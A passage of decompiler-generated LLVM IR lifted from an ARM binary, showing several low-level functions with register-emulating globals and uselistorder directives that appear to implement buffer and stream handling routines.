90, 231, 232, 233, 234, 235, 236, 2, 42, 43, 44, 45, 46, 47, 131, 237, 130, 238, 239, 240, 241, 242, 243, 133, 244, 134, 245, 135, 246, 48, 3, 49, 50, 51, 52, 53, 136, 247, 132, 248, 249, 250, 251, 252, 253, 138, 254, 139, 255, 140, 256, 54, 4, 55, 56, 57, 58, 59, 141, 257, 137, 258, 259, 261, 142, 260, 143, 144, 262, 62, 263, 264, 265, 266, 267, 268, 146, 145, 269, 280, 63, 281, 282, 148, 283, 149, 284, 285, 286, 287, 288, 150, 289, 147, 290, 78, 272, 151, 79, 198, 158 }
  uselistorder label %dec_label_pc_15cf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15cf0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_15c74, { 1, 0 }
  uselistorder label %dec_label_pc_15c3c, { 1, 0 }
}

define i32 @function_15d04(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d04:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 124804, i32* %r2.global-to-local, align 4
  %v4_15d10 = load i32, i32* inttoptr (i32 124904 to i32*), align 8
  %v4_15d18 = load i32, i32* inttoptr (i32 124868 to i32*), align 4
  store i32 %v4_15d18, i32* %r1.global-to-local, align 4
  %v1_15d1c = add i32 %arg1, 44
  %v2_15d1c = inttoptr i32 %v1_15d1c to i32*
  %v3_15d1c = load i32, i32* %v2_15d1c, align 4
  %v1_15d20 = add i32 %arg1, 28
  %v2_15d20 = inttoptr i32 %v1_15d20 to i32*
  %v3_15d20 = load i32, i32* %v2_15d20, align 4
  store i32 %v3_15d20, i32* %r2.global-to-local, align 4
  %v2_15d24 = inttoptr i32 %v4_15d10 to i32*
  store i32 %v3_15d1c, i32* %v2_15d24, align 4
  %v0_15d28 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d28 = load i32, i32* %r1.global-to-local, align 4
  %v2_15d28 = inttoptr i32 %v1_15d28 to i32*
  store i32 %v0_15d28, i32* %v2_15d28, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 40, 1, 2, 4, 5, 6, 3, 7, 8, 9, 13, 10, 14, 12, 24, 25, 26, 27, 28, 29, 21, 22, 23, 19, 20, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 11, 0, 15, 16, 17, 18 }
  uselistorder i32 124804, { 40, 0, 41, 42, 1, 2, 43, 3, 4, 5, 44, 45, 6, 7, 46, 8, 47, 48, 49, 50, 9, 35, 31, 29, 28, 30, 32, 33, 34, 27, 36, 22, 24, 23, 21, 20, 25, 26, 17, 16, 19, 18, 15, 14, 13, 12, 37, 38, 39, 51, 52, 53, 10, 11 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_15d34(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d34:
  %v0_15d34 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15d34, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15d34
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15d34, %bb
  %v4_15d38 = phi i32 [ %arg1, %dec_label_pc_15d34 ], [ 0, %bb ]
  ret i32 %v4_15d38

; uselistorder directives
  uselistorder i1* @cpsr_z, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 30, 11, 12, 13, 26, 27, 28, 29, 14, 15, 16, 17, 18, 19, 24, 25, 20, 21, 22, 23, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15d3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d78:
  store i32 %arg1, i32* @global_var_20a48.492, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* @global_var_20a48.492, { 1, 0, 2 }
}

define i32 @function_15d88(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15d88:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15d88 = load i32, i32* @r7, align 4
  store i32 %v3_15d88, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15db0, label %dec_label_pc_15da0

dec_label_pc_15da0:                               ; preds = %dec_label_pc_15d88
  %v0_15da0 = call i32 @function_11200()
  %v0_15da4 = load i32, i32* %r7.global-to-local, align 4
  %v1_15da4 = sub i32 0, %v0_15da4
  %v2_15da8 = inttoptr i32 %v0_15da0 to i32*
  store i32 %v1_15da4, i32* %v2_15da8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15db4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15db0

dec_label_pc_15db0:                               ; preds = %dec_label_pc_15d88, %dec_label_pc_15da0
  %v2_15db4 = phi i32 [ %v3_15d88, %dec_label_pc_15d88 ], [ %v2_15db4.pre, %dec_label_pc_15da0 ]
  %v0_15db0 = phi i32 [ %arg1, %dec_label_pc_15d88 ], [ -1, %dec_label_pc_15da0 ]
  store i32 %v2_15db4, i32* %r7.global-to-local, align 4
  ret i32 %v0_15db0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15db0, { 1, 0 }
}

define i32 @function_15dbc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15dbc:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15dc0 = load i32, i32* @r4, align 4
  %v6_15dc0 = load i32, i32* @r5, align 4
  %v12_15dc0 = load i32, i32* @r7, align 4
  %v1_15dc4 = add i32 %arg3, 14
  %v2_15dcc = ptrtoint i32* %stack_var_-72 to i32
  %v1_15dd0 = and i32 %v1_15dc4, -8
  %v2_15dd4 = sub i32 %v2_15dcc, %v1_15dd0
  %v1_15dd8 = add i32 %v2_15dd4, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_15dd8, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_15e14, label %dec_label_pc_15e00

dec_label_pc_15e00:                               ; preds = %dec_label_pc_15dbc
  %v0_15e00 = call i32 @function_11200()
  %v0_15e04 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e04 = sub i32 0, %v0_15e04
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15e0c = inttoptr i32 %v0_15e00 to i32*
  store i32 %v1_15e04, i32* %v2_15e0c, align 4
  %v0_15e1c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15e1c

dec_label_pc_15e14:                               ; preds = %dec_label_pc_15dbc
  br i1 false, label %dec_label_pc_15e1c, label %dec_label_pc_15e24

dec_label_pc_15e1c:                               ; preds = %dec_label_pc_15e14, %dec_label_pc_15e00
  %v0_15e1c = phi i32 [ -1, %dec_label_pc_15e14 ], [ %v0_15e1c.pre, %dec_label_pc_15e00 ]
  store i32 %v0_15e1c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ef0

dec_label_pc_15e24:                               ; preds = %dec_label_pc_15e14
  %v2_15e24 = add i32 %v1_15dd8, %arg1
  %v2_15e28 = add i32 %tmp, %arg3
  store i32 %v2_15e28, i32* @ip, align 4
  store i32 %v1_15dd8, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15ed8

dec_label_pc_15e44:                               ; preds = %dec_label_pc_15ed8
  %v1_15e44 = add i32 %v0_15e98, 16
  %v2_15e44 = inttoptr i32 %v1_15e44 to i16*
  %v3_15e44 = load i16, i16* %v2_15e44, align 2
  %v4_15e44 = zext i16 %v3_15e44 to i32
  %v1_15e48 = add nuw nsw i32 %v4_15e44, 7
  %v1_15e4c = and i32 %v1_15e48, 131064
  store i32 %v1_15e4c, i32* %r2.global-to-local, align 4
  %v2_15e54 = add i32 %v1_15e4c, %v0_15ea0
  store i32 %v2_15e54, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_15e54, %v2_15e28
  br i1 %tmp26, label %dec_label_pc_15e60, label %dec_label_pc_15e94

dec_label_pc_15e60:                               ; preds = %dec_label_pc_15e44
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_15e68 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15e68, i32* %r2.global-to-local, align 4
  %v0_15e6c = load i32, i32* %sl.global-to-local, align 4
  %v1_15e70 = load i32, i32* @sp, align 4
  %v2_15e70 = inttoptr i32 %v1_15e70 to i32*
  store i32 0, i32* %v2_15e70, align 4
  %v4_15e74 = call i32 @function_160f8(i32 %arg1, i32 0, i32 %v0_15e68, i32 %v0_15e6c)
  %v0_15e78 = load i32, i32* @r5, align 4
  %v1_15e78 = load i32, i32* %r6.global-to-local, align 4
  %v9_15e78 = icmp eq i32 %v0_15e78, %v1_15e78
  br i1 %v9_15e78, label %dec_label_pc_15e80, label %dec_label_pc_15eec

dec_label_pc_15e80:                               ; preds = %dec_label_pc_15e60
  %v0_15e80 = call i32 @function_11200()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_15e8c = inttoptr i32 %v0_15e80 to i32*
  store i32 22, i32* %v2_15e8c, align 4
  %v0_15ef0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ef0

dec_label_pc_15e94:                               ; preds = %dec_label_pc_15e44
  %v1_15e94 = inttoptr i32 %v0_15e98 to i32*
  %v2_15e94 = load i32, i32* %v1_15e94, align 4
  %v3_15e94 = add i32 %v0_15e98, 4
  %v4_15e94 = inttoptr i32 %v3_15e94 to i32*
  %v5_15e94 = load i32, i32* %v4_15e94, align 4
  store i32 %v5_15e94, i32* %r4.global-to-local, align 4
  %v1_15e98 = add i32 %v0_15e98, 8
  store i32 %v1_15e98, i32* %sb.global-to-local, align 4
  %v1_15e9c = inttoptr i32 %v1_15e98 to i32*
  %v2_15e9c = load i32, i32* %v1_15e9c, align 4
  store i32 %v2_15e9c, i32* %sb.global-to-local, align 4
  %v3_15e9c = add i32 %v0_15e98, 12
  %v4_15e9c = inttoptr i32 %v3_15e9c to i32*
  %v5_15e9c = load i32, i32* %v4_15e9c, align 4
  store i32 %v5_15e9c, i32* %sl.global-to-local, align 4
  %v1_15ea0 = inttoptr i32 %v0_15ea0 to i32*
  store i32 %v2_15e94, i32* %v1_15ea0, align 4
  %v3_15ea0 = add i32 %v0_15ea0, 4
  %v4_15ea0 = inttoptr i32 %v3_15ea0 to i32*
  %v5_15ea0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15ea0, i32* %v4_15ea0, align 4
  %v0_15ea4 = load i32, i32* @r7, align 4
  %v1_15ea4 = add i32 %v0_15ea4, 8
  %v1_15ea8 = inttoptr i32 %v1_15ea4 to i32*
  %v2_15ea8 = load i32, i32* %v1_15ea8, align 4
  %v3_15ea8 = add i32 %v0_15ea4, 12
  %v4_15ea8 = inttoptr i32 %v3_15ea8 to i32*
  %v5_15ea8 = load i32, i32* %v4_15ea8, align 4
  store i32 %v5_15ea8, i32* @r4, align 4
  %v1_15eac = load i32, i32* @r5, align 4
  %v2_15eac = add i32 %v1_15eac, 8
  %v3_15eac = inttoptr i32 %v2_15eac to i32*
  store i32 %v2_15ea8, i32* %v3_15eac, align 4
  %v0_15eb0 = load i32, i32* @r4, align 4
  %v1_15eb0 = load i32, i32* @r5, align 4
  %v2_15eb0 = add i32 %v1_15eb0, 12
  %v3_15eb0 = inttoptr i32 %v2_15eb0 to i32*
  store i32 %v0_15eb0, i32* %v3_15eb0, align 4
  %v0_15eb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15eb4 = trunc i32 %v0_15eb4 to i16
  %v2_15eb4 = load i32, i32* @r5, align 4
  %v3_15eb4 = add i32 %v2_15eb4, 16
  %v4_15eb4 = inttoptr i32 %v3_15eb4 to i16*
  store i16 %v1_15eb4, i16* %v4_15eb4, align 2
  %v0_15eb8 = load i32, i32* @r7, align 4
  %v1_15eb8 = add i32 %v0_15eb8, 18
  %v2_15eb8 = inttoptr i32 %v1_15eb8 to i8*
  %v3_15eb8 = load i8, i8* %v2_15eb8, align 1
  %v4_15eb8 = zext i8 %v3_15eb8 to i32
  store i32 %v4_15eb8, i32* @r3, align 4
  %v2_15ebc = load i32, i32* @r5, align 4
  %v3_15ebc = add i32 %v2_15ebc, 18
  %v4_15ebc = inttoptr i32 %v3_15ebc to i8*
  store i8 %v3_15eb8, i8* %v4_15ebc, align 1
  %v0_15ec0 = load i32, i32* @r7, align 4
  %v1_15ec0 = add i32 %v0_15ec0, 16
  %v2_15ec0 = inttoptr i32 %v1_15ec0 to i16*
  %v3_15ec0 = load i16, i16* %v2_15ec0, align 2
  %v4_15ec0 = zext i16 %v3_15ec0 to i32
  %v1_15ec4 = add nsw i32 %v4_15ec0, -19
  store i32 %v1_15ec4, i32* @r2, align 4
  %v0_15ec8 = call i32 @function_11300()
  %v0_15ecc = load i32, i32* @r7, align 4
  %v1_15ecc = add i32 %v0_15ecc, 16
  %v2_15ecc = inttoptr i32 %v1_15ecc to i16*
  %v3_15ecc = load i16, i16* %v2_15ecc, align 2
  %v4_15ecc = zext i16 %v3_15ecc to i32
  %v0_15ed0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15ed0, i32* @r5, align 4
  %v2_15ed4 = add i32 %v4_15ecc, %v0_15ecc
  store i32 %v2_15ed4, i32* @r7, align 4
  br label %dec_label_pc_15ed8

dec_label_pc_15ed8:                               ; preds = %dec_label_pc_15e24, %dec_label_pc_15e94
  %v0_15ea0 = phi i32 [ %tmp, %dec_label_pc_15e24 ], [ %v0_15ed0, %dec_label_pc_15e94 ]
  %v0_15e98 = phi i32 [ %v1_15dd8, %dec_label_pc_15e24 ], [ %v2_15ed4, %dec_label_pc_15e94 ]
  %v3_15edc = icmp ult i32 %v0_15e98, %v2_15e24
  %v1_15ee0 = add i32 %v0_15ea0, 19
  store i32 %v1_15ee0, i32* @r0, align 4
  %v1_15ee4 = add i32 %v0_15e98, 19
  store i32 %v1_15ee4, i32* @r1, align 4
  br i1 %v3_15edc, label %dec_label_pc_15e44, label %dec_label_pc_15eec.loopexit

dec_label_pc_15eec.loopexit:                      ; preds = %dec_label_pc_15ed8
  %v0_15eec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15eec

dec_label_pc_15eec:                               ; preds = %dec_label_pc_15eec.loopexit, %dec_label_pc_15e60
  %v1_15eec = phi i32 [ %v0_15ea0, %dec_label_pc_15eec.loopexit ], [ %v0_15e78, %dec_label_pc_15e60 ]
  %v0_15eec = phi i32 [ %v0_15eec.pre, %dec_label_pc_15eec.loopexit ], [ %v1_15e78, %dec_label_pc_15e60 ]
  %v2_15eec = sub i32 %v1_15eec, %v0_15eec
  store i32 %v2_15eec, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ef0

dec_label_pc_15ef0:                               ; preds = %dec_label_pc_15e80, %dec_label_pc_15e1c, %dec_label_pc_15eec
  %v0_15ef0 = phi i32 [ %v0_15ef0.pre, %dec_label_pc_15e80 ], [ %v0_15e1c, %dec_label_pc_15e1c ], [ %v2_15eec, %dec_label_pc_15eec ]
  store i32 %v3_15dc0, i32* %r4.global-to-local, align 4
  store i32 %v6_15dc0, i32* @r5, align 4
  store i32 %v12_15dc0, i32* @r7, align 4
  ret i32 %v0_15ef0

; uselistorder directives
  uselistorder i32 %v0_15e98, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_15ea0, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_15dd8, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 8, 9, 0, 3, 10, 4, 11, 12, 5, 6, 7, 1, 13, 2, 14 }
  uselistorder i32* @r3, { 7, 8, 52, 53, 85, 86, 2, 87, 88, 89, 3, 90, 91, 92, 4, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 0, 111, 112, 113, 114, 9, 6, 10, 11, 12, 13, 14, 54, 55, 115, 124, 125, 126, 119, 47, 48, 78, 79, 80, 81, 82, 76, 77, 15, 16, 17, 130, 127, 128, 129, 1, 131, 132, 133, 120, 18, 83, 38, 39, 40, 121, 122, 123, 70, 56, 116, 117, 118, 49, 50, 51, 57, 58, 5, 59, 60, 61, 62, 32, 33, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 37, 41, 42, 44, 43, 84, 45, 46, 63, 64, 65, 66, 67, 68, 69, 71, 72, 73, 74, 75 }
  uselistorder i32 18, { 5, 6, 4, 7, 0, 8, 1, 9, 2, 10, 3, 11 }
  uselistorder i32 22, { 1, 0, 12, 2, 3, 4, 5, 6, 7, 13, 14, 8, 9, 10, 11 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 7, { 24, 22, 23, 14, 0, 1, 41, 15, 29, 16, 25, 17, 26, 18, 27, 19, 28, 2, 20, 30, 21, 31, 4, 32, 5, 33, 6, 7, 34, 8, 35, 9, 36, 10, 37, 11, 12, 38, 13, 40, 3, 39 }
  uselistorder i32* @ip, { 7, 8, 9, 79, 10, 11, 6, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 2, 113, 114, 115, 116, 117, 118, 119, 120, 121, 12, 0, 13, 14, 15, 16, 17, 122, 123, 41, 65, 66, 67, 68, 3, 69, 70, 71, 59, 60, 61, 62, 63, 64, 72, 73, 74, 127, 124, 125, 126, 1, 128, 28, 29, 30, 31, 18, 19, 75, 76, 77, 32, 33, 34, 53, 54, 55, 56, 57, 58, 45, 46, 47, 48, 49, 50, 4, 22, 20, 23, 24, 51, 52, 78, 21, 25, 26, 27, 35, 36, 37, 38, 39, 40, 42, 5, 43, 44 }
  uselistorder i1 false, { 0, 25, 26, 27, 38, 21, 24, 39, 40, 41, 42, 43, 2, 1, 28, 31, 30, 29, 32, 4, 6, 5, 18, 37, 22, 23, 10, 35, 17, 19, 20, 9, 8, 7, 11, 12, 13, 33, 3, 14, 15, 16, 36, 34, 44 }
  uselistorder i32 -8, { 37, 17, 18, 19, 20, 21, 22, 16, 15, 9, 14, 13, 12, 11, 23, 24, 25, 26, 27, 39, 28, 29, 30, 31, 32, 38, 40, 33, 41, 36, 10, 34, 35, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 14, { 10, 14, 26, 6, 7, 8, 0, 11, 12, 9, 3, 13, 4, 15, 16, 5, 17, 18, 19, 20, 1, 21, 22, 23, 24, 2, 25 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15ef0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ed8, { 1, 0 }
}

define i32 @function_15f00(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15f00:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15f00 = load i32, i32* @r4, align 4
  store i32 %v3_15f00, i32* %stack_var_-12, align 4
  %v0_15f04 = load i32, i32* %r0.global-to-local, align 4
  %v1_15f04 = inttoptr i32 %v0_15f04 to i16*
  %v2_15f04 = load i16, i16* %v1_15f04, align 2
  %v3_15f04 = zext i16 %v2_15f04 to i32
  %v1_15f08 = and i32 %v3_15f04, 4
  store i32 %v1_15f08, i32* %r5.global-to-local, align 4
  %v2_15f08 = icmp eq i32 %v1_15f08, 0
  store i32 %v0_15f04, i32* %r4.global-to-local, align 4
  br i1 %v2_15f08, label %dec_label_pc_15f1c, label %bb

bb:                                               ; preds = %dec_label_pc_15f00
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_15f1c:                               ; preds = %dec_label_pc_15f00
  %v1_15f1c = icmp slt i32 %arg2, 0
  br i1 %v1_15f1c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_15f1c
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_15f1c, %bb18
  %v1_15f24 = add i32 %v0_15f04, 4
  %v2_15f24 = inttoptr i32 %v1_15f24 to i32*
  %v3_15f24 = load i32, i32* %v2_15f24, align 4
  store i32 %v3_15f24, i32* %r0.global-to-local, align 4
  %v1_15f28 = call i32 @function_10b70(i32 %v3_15f24)
  store i32 %v1_15f28, i32* %r0.global-to-local, align 4
  %v5_15f30 = icmp sgt i32 %v1_15f28, 0
  br i1 %v5_15f30, label %.thread7, label %dec_label_pc_15f34

dec_label_pc_15f34:                               ; preds = %bb19
  %v2_15f2c = icmp eq i32 %v1_15f28, 0
  %v0_15f34 = load i32, i32* %r4.global-to-local, align 4
  %v1_15f34 = inttoptr i32 %v0_15f34 to i16*
  %v2_15f34 = load i16, i16* %v1_15f34, align 2
  br i1 %v2_15f2c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_15f34
  %v2_15f38 = or i16 %v2_15f34, 4
  store i16 %v2_15f38, i16* %v1_15f34, align 2
  %v1_15f54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_15f34
  %v2_15f3c = or i16 %v2_15f34, 8
  store i16 %v2_15f3c, i16* %v1_15f34, align 2
  %v1_15f48 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15f48, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_15f54 = phi i32 [ %v1_15f54.pre, %bb20 ], [ 0, %bb ], [ %v1_15f28, %bb19 ], [ %v1_15f48, %bb21 ]
  %v2_15f50 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15f50, i32* @r4, align 4
  ret i32 %v1_15f54

; uselistorder directives
  uselistorder i16 %v2_15f34, { 1, 0 }
  uselistorder i32 %v1_15f28, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_10b70, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_15f58(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15f58:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_15f58 = load i32, i32* @r4, align 4
  store i32 %v3_15f58, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_15f702 = icmp eq i32 %arg3, 0
  store i1 %v2_15f702, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15f702, label %dec_label_pc_16000, label %dec_label_pc_15f78

dec_label_pc_15f70thread-pre-split:               ; preds = %dec_label_pc_15f78
  %v3_15f90 = load i32, i32* %r6.global-to-local, align 4
  %v5_15f90 = add i32 %v3_15f90, %v3_15f88
  store i32 %v5_15f90, i32* %r6.global-to-local, align 4
  %v4_15f94 = load i32, i32* %r5.global-to-local, align 4
  %v5_15f94 = sub i32 %v4_15f94, %v3_15f88
  store i32 %v5_15f94, i32* %r5.global-to-local, align 4
  %v2_15f70 = icmp eq i32 %v5_15f94, 0
  store i1 %v2_15f70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15f70, label %dec_label_pc_15f70.dec_label_pc_16000.loopexit_crit_edge, label %dec_label_pc_15f70thread-pre-split.dec_label_pc_15f78_crit_edge

dec_label_pc_15f70thread-pre-split.dec_label_pc_15f78_crit_edge: ; preds = %dec_label_pc_15f70thread-pre-split
  %v3_15f78.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_15f84.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15f78

dec_label_pc_15f78:                               ; preds = %dec_label_pc_15f58, %dec_label_pc_15f70thread-pre-split.dec_label_pc_15f78_crit_edge
  %v0_15f84 = phi i32 [ %v0_15f84.pre, %dec_label_pc_15f70thread-pre-split.dec_label_pc_15f78_crit_edge ], [ %tmp, %dec_label_pc_15f58 ]
  %v0_15f80 = phi i32 [ %v5_15f90, %dec_label_pc_15f70thread-pre-split.dec_label_pc_15f78_crit_edge ], [ %arg2, %dec_label_pc_15f58 ]
  %v3_15f78 = phi i32 [ %v3_15f78.pre, %dec_label_pc_15f70thread-pre-split.dec_label_pc_15f78_crit_edge ], [ 2147483647, %dec_label_pc_15f58 ]
  %v0_15f7c.in = phi i32 [ %v5_15f94, %dec_label_pc_15f70thread-pre-split.dec_label_pc_15f78_crit_edge ], [ %arg3, %dec_label_pc_15f58 ]
  %v3_15f7c = phi i32 [ %v5_15f94, %dec_label_pc_15f70thread-pre-split.dec_label_pc_15f78_crit_edge ], [ %arg3, %dec_label_pc_15f58 ]
  %v0_15f7c = icmp slt i32 %v0_15f7c.in, 0
  %storemerge = select i1 %v0_15f7c, i32 %v3_15f78, i32 %v3_15f7c
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_15f80, i32* %r1.global-to-local, align 4
  %v1_15f84 = add i32 %v0_15f84, 4
  %v2_15f84 = inttoptr i32 %v1_15f84 to i32*
  %v3_15f84 = load i32, i32* %v2_15f84, align 4
  %v3_15f88 = call i32 @function_10ce4(i32 %v3_15f84, i32 %v0_15f80)
  %v1_15f8c = icmp slt i32 %v3_15f88, 0
  %v2_15f8c = icmp eq i32 %v3_15f88, 0
  store i1 %v2_15f8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_15f8c, label %dec_label_pc_15f9c, label %dec_label_pc_15f70thread-pre-split

dec_label_pc_15f9c:                               ; preds = %dec_label_pc_15f78
  %v0_15f9c = load i32, i32* %r4.global-to-local, align 4
  %v1_15f9c = inttoptr i32 %v0_15f9c to i16*
  %v2_15f9c = load i16, i16* %v1_15f9c, align 2
  %v3_15f9c = zext i16 %v2_15f9c to i32
  store i32 %v3_15f9c, i32* %r3.global-to-local, align 4
  %v1_15fa0 = add i32 %v0_15f9c, 8
  store i32 %v1_15fa0, i32* %r1.global-to-local, align 4
  %v1_15fa4 = inttoptr i32 %v1_15fa0 to i32*
  %v2_15fa4 = load i32, i32* %v1_15fa4, align 4
  store i32 %v2_15fa4, i32* %r1.global-to-local, align 4
  %v3_15fa4 = add i32 %v0_15f9c, 12
  %v4_15fa4 = inttoptr i32 %v3_15fa4 to i32*
  %v5_15fa4 = load i32, i32* %v4_15fa4, align 4
  %v1_15fa8 = or i32 %v3_15f9c, 8
  store i32 %v1_15fa8, i32* %r3.global-to-local, align 4
  %v2_15fac = sub i32 %v5_15fa4, %v2_15fa4
  store i32 %v2_15fac, i32* %r2.global-to-local, align 4
  %v9_15fac = icmp eq i32 %v5_15fa4, %v2_15fa4
  store i1 %v9_15fac, i1* %cpsr_z.global-to-local, align 1
  %v1_15fb0 = trunc i32 %v1_15fa8 to i16
  store i16 %v1_15fb0, i16* %v1_15f9c, align 2
  br i1 %v9_15fac, label %dec_label_pc_15f9c.dec_label_pc_15ffc_crit_edge, label %dec_label_pc_15fb8

dec_label_pc_15f9c.dec_label_pc_15ffc_crit_edge:  ; preds = %dec_label_pc_15f9c
  %v0_15ffc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_15fb8:                               ; preds = %dec_label_pc_15f9c
  %v0_15fb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fb8 = load i32, i32* %r5.global-to-local, align 4
  %v3_15fb8 = icmp ult i32 %v0_15fb8, %v1_15fb8
  %v9_15fb8 = icmp eq i32 %v0_15fb8, %v1_15fb8
  store i1 %v9_15fb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15fb8, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_15fb8
  store i32 %v1_15fb8, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_15fb8, %bb23
  %v2_15fcc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

